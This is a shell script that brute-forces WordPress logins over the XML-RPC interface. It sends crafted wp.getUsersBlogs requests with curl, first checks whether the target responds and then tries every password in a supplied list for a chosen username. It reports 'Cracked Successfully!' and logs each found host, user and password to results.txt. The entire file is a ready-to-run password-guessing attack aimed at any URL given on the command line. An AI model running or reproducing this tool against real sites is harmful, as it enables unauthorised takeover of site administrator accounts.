#!/bin/sh
# Bruteforce single Wordpress XMLRPC
# Created: 21-06-2021
# Script Author : Chi Vo
# Usage: sh wordpress-xmlrpc.sh http://localhost/xmlrpc.php admin pass.txt

prefix=" \
<?xml version=\"1.0\"?><methodCall><methodName>system.multicall</methodName><params><param><value><array><data> \
<value><struct><member><name>methodName</name><value><string>wp.getUsersBlogs</string></value></member><member><name>params</name> \
<value><array><data><value><array><data><value><string> \
"
payload="</string></value><value><string>"
suffix=" \
</string></value> \
</data></array></value></data></array></value></member></struct></value> \
</data></array></value></param></params></methodCall> \
"

check_vuln() {
	TARGET=$1
	printf "${YELLOW}Check site live ..."
	echo
	response=$(curl -kis -X POST "$TARGET" -d "$prefix x $payload x $suffix" | grep "faultCode" | wc -l)
	if [ $response -eq 1 ]
	then
		printf "${LIGHTGREEN}Target Vuln Ok ${NC}"
		echo
	else
		printf "${RED}Target Not Vuln !\n"
		echo
		exit
	fi
}

crack_pass() {
	TARGET=$1
	USER=$2
	PASS_LIST=$3
	while read p; do
		printf "Trying user ${LIGHTGREEN} $USER ${NC} with pass: ${YELLOW} $p ${NC}"
		echo
		response=$(curl -kis -X POST "$TARGET" -d "$prefix $USER $payload $p $suffix" | grep "isAdmin" | wc -l)
		if [ $response -eq 1 ]; then
			printf "${LIGHTGREEN}Pass Found: $p"
			echo
			PASSWORD=$p
			break
		fi
	done <$PASS_LIST
	if [ ! "$PASSWORD" ]; then
		printf "${RED}Password not found with username: $USER_INPUT"
		echo
		exit
	fi
}

usage() {
	printf "Usage: ${YELLOW}sh $0 http://localhost/xmlrpc.php admin pass.txt"
	echo
}

# Color
LIGHTRED='\033[1;31m'
RED='\033[0;31m'
GREEN='\033[0;32m'
LIGHTGREEN='\033[1;32m'
YELLOW='\033[1;33m'
NC='\033[0m'

TARGET=$1
USER_INPUT=$2
PASS_LIST=$3

if [ ! "$TARGET" ]; then
	usage
	exit
fi
if [ ! "$USER_INPUT" ]; then
	usage
	exit
fi
if [ ! "$PASS_LIST" ]; then
	usage
	exit
fi

echo "Cracking target : $TARGET"
check_vuln $TARGET
crack_pass $TARGET $USER_INPUT $PASS_LIST
echo
printf "${LIGHTGREEN}Cracked Successfully! \n"
echo "User: $USER_INPUT"
echo "Pass: $PASSWORD"
echo "$TARGET|$USER_INPUT|$PASSWORD" >>results.txt
